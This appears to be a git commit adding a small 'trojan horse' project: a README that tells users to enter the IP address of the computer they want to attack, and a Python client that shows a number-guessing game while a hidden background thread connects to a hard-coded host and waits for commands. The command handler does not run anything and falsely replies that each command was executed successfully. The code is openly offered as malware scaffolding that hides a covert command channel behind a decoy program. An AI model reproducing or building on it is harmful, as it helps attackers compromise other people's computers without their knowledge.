8058c1b8afd9705ebc081fc6c57f6eb888e3088f
Leovaldez42 <gaurav4.037@gmail.com>
2020-12-27 14:25:20 +0530

    added trojan-horse

---
+++ trojan-horse/README.md
@@ -0,0 +1,20 @@
+# Trojan horse
+#### A simple trojan horse attack way.
+
+---
+## Usage:
+
+##### IP address can be found using
+
+for windows
+```
+ipconfig
+```
+
+for linux
+```
+ifconfig
+```
+
+##### Insert the ip address of the computer/laptop you want to attack in client.py
+##### Insert your ipaddress in server.py
---
+++ trojan-horse/client.py
@@ -0,0 +1,46 @@
+import random
+import socket
+import threading
+
+
+def trojan():
+    HOST = 'host private ip address'
+    PORT = 9090
+
+    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    client.connect((HOST, PORT))
+
+    while True:
+        server_command = client.recv(1024).decode('utf-8')
+        if server_command == 'hello':
+            print("hello")
+        client.send(f"{server_command} was executed successfully!".encode('utf-8'))
+
+
+def game():
+    number = random.randint(0, 1000)
+    tries = 1
+    done = False
+    
+    while not done:
+        guess = int(input("Enter a guess: "))
+
+        if guess == number:
+            done = True
+            print("You won")
+
+        else:
+            tries += 1
+            if guess > number:
+                print("The actual number is smaller!")
+            else:
+                print("The actual number is larger!")
+
+    print(f"You needed {tries} tries")
+
+
+t1 = threading.Thread(target=game)
+t2 = threading.Thread(target=trojan)
+
+t1.start()
+t2.start()
